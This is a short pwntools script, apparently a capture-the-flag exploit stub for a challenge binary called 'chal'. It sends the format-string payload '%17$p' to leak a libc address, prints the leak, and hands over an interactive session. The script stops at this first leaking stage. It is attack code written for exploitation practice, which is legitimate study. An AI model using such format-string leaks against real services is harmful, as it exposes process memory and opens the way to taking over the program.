#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal")

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 13775)

    return r


context.binary = exe
def main():
    r = conn()
    pause()
    r.sendline(b'%17$p')
    libc_leak = int(r.recvline(), 16)
    info(b'Libc leak address: ' + hex(libc_leak).encode())
    pause()
    r.interactive()

if __name__ == "__main__":
    main()
